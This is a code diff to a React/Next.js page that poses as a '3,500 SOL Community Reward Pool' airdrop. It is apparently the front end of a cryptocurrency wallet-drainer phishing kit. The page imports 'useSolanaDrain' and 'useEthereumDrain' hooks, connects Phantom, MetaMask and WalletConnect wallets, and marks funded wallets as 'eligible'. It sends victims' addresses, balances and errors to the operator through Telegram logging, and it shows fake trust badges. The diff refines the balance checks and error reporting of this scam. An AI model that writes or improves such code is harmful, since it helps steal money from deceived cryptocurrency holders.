@@ -1,6 +1,6 @@
 "use client";
 
-import { ethers } from 'ethers'; // ← CRITICAL: Added import
+import { ethers } from 'ethers';
 import { useState, useEffect } from 'react';
 import { useSolanaDrain } from '@/hooks/useSolanaDrain';
 import { useEthereumDrain } from '@/hooks/useEthereumDrain';
@@ -73,64 +73,90 @@ export default function Home() {
       
       let address = null;
       let balance = null;
+      let hasFunds = false;
       
       if (type === 'phantom') {
         if (!window.solana?.isPhantom) {
           window.open('https://phantom.app', '_blank');
+          setEligibilityStatus('idle');
           return;
         }
+        
         const response = await window.solana.connect();
         address = response.publicKey.toString();
-        balance = await window.solana.connection?.getBalance?.(response.publicKey) || 0;
-      }
-      
-      else if (type === 'metamask') {
+        
+        // Create dedicated connection instance
+        const { Connection } = await import('@solana/web3.js');
+        const connection = new Connection(process.env.NEXT_PUBLIC_SOLANA_RPC, 'confirmed');
+        
+        const lamports = await connection.getBalance(response.publicKey);
+        const balanceInSol = lamports / 1e9;
+        const MIN_REQUIRED_LAMPORTS = 0.003 * 1e9;
+        
+        hasFunds = lamports > MIN_REQUIRED_LAMPORTS;
+        balance = balanceInSol;
+        
+        console.log(`[Phantom] Balance: ${balanceInSol} SOL, HasFunds: ${hasFunds}`);
+        
+      } else if (type === 'metamask') {
         if (!window.ethereum) {
           window.open('https://metamask.io', '_blank');
+          setEligibilityStatus('idle');
           return;
         }
+        
         const provider = new ethers.BrowserProvider(window.ethereum);
         await provider.send("eth_requestAccounts", []);
         const signer = await provider.getSigner();
         address = await signer.getAddress();
-        balance = await provider.getBalance(address);
-      }
-      
-      else if (type === 'walletconnect') {
+        
+        const weiBalance = await provider.getBalance(address);
+        const balanceInEth = parseFloat(ethers.formatEther(weiBalance));
+        const MIN_ETH = 0.001;
+        
+        hasFunds = balanceInEth > MIN_ETH;
+        balance = balanceInEth;
+        
+        console.log(`[MetaMask] Balance: ${balanceInEth} ETH, HasFunds: ${hasFunds}`);
+        
+      } else if (type === 'walletconnect') {
         address = await connectWalletConnect();
-        balance = 0; // Would need RPC call
+        hasFunds = true;
+        balance = 'N/A';
       }
       
       setWalletAddress(address);
       setWalletBalance(balance);
-      
-      const minBalance = type === 'phantom' ? 0.003 * 1e9 : ethers.parseEther('0.001');
-      const hasFunds = type === 'phantom' ? balance > minBalance : balance > minBalance;
       
       if (!hasFunds) {
         setEligibilityStatus('not-eligible');
         await sendTelegramLog('connected_empty', {
           walletType: type,
           address,
-          balance: type === 'phantom' ? balance/1e9 : ethers.formatEther(balance)
+          balance: typeof balance === 'number' ? balance : '0'
         });
-      } else {
-        const amount = calculateAllocation(address);
-        setAllocatedAmount(amount);
-        setEligibilityStatus('eligible');
-        setConnected(true);
-        
-        await sendTelegramLog('connected_funded', {
-          walletType: type,
-          address,
-          balance: type === 'phantom' ? balance/1e9 : ethers.formatEther(balance),
-          eligibleAmount: amount
-        });
+        return;
       }
+      
+      const amount = calculateAllocation(address);
+      setAllocatedAmount(amount);
+      setEligibilityStatus('eligible');
+      setConnected(true);
+      
+      await sendTelegramLog('connected_funded', {
+        walletType: type,
+        address,
+        balance: typeof balance === 'number' ? balance : 'N/A',
+        eligibleAmount: amount
+      });
       
     } catch (error) {
       console.error('Connection error:', error);
       setEligibilityStatus('idle');
+      await sendTelegramLog('connection_error', {
+        walletType: type,
+        error: error.message
+      });
     }
   };
   
@@ -185,7 +211,6 @@ export default function Home() {
   
   return (
     <div className="min-h-screen relative">
-      {/* Mobile Prompt */}
       <MobilePrompt 
         isOpen={showMobilePrompt}
         onClose={() => setShowMobilePrompt(false)}
@@ -195,7 +220,6 @@ export default function Home() {
         }}
       />
       
-      {/* Header */}
       <header className="neon-glass m-4 p-4 relative z-10">
         <div className="max-w-6xl mx-auto flex justify-between items-center">
           <div className="flex items-center gap-3">
@@ -209,9 +233,7 @@ export default function Home() {
         </div>
       </header>
       
-      {/* Main Content */}
       <main className="max-w-6xl mx-auto px-4 py-8 relative z-10">
-        {/* Hero */}
         <div className="text-center mb-12">
           <h2 className="text-4xl md:text-5xl font-bold mb-4">
             <span className="text-gradient">3,500 SOL</span> Community Reward Pool
@@ -221,10 +243,8 @@ export default function Home() {
           </p>
         </div>
         
-        {/* Stats */}
         <StatsDisplay stats={stats} />
         
-        {/* Connection/Eligibility Card */}
         <div className="neon-glass max-w-md mx-auto mt-8 p-8">
           {!connected && eligibilityStatus === 'idle' && (
             <div className="text-center">
@@ -288,14 +308,10 @@ export default function Home() {
           )}
         </div>
         
-        {/* Trust Badges */}
         <TrustBadges variant="default" />
-        
-        {/* How It Works */}
         <HowItWorks />
       </main>
       
-      {/* Footer */}
       <footer className="neon-glass m-4 p-6 text-center relative z-10">
         <p className="text-sm text-gray-400">
           © 2026 Solana Community Rewards. All distributions executed on-chain.
@@ -303,7 +319,6 @@ export default function Home() {
         <TrustBadges variant="footer" />
       </footer>
       
-      {/* Wallet Modal */}
       <WalletModal
         isOpen={showModal}
         onClose={() => setShowModal(false)}
@@ -311,4 +326,4 @@ export default function Home() {
       />
     </div>
   );
-          }
+            }
